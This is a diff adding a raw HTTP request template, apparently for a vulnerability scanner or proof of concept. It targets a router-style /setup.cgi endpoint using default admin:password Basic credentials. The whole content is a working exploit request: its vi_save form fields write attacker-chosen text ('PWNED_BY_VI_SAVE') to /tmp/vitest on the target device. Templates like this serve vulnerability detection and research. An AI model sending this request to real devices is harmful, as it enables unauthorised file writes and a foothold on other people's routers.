@@ -1,0 +1,7 @@
+POST /setup.cgi HTTP/1.1
+Host: {{target}}
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+todo=vi_save&next_file=system_command.htm&savetopath=%2Ftmp%2Fvitest&outlog_Display=PWNED_BY_VI_SAVE
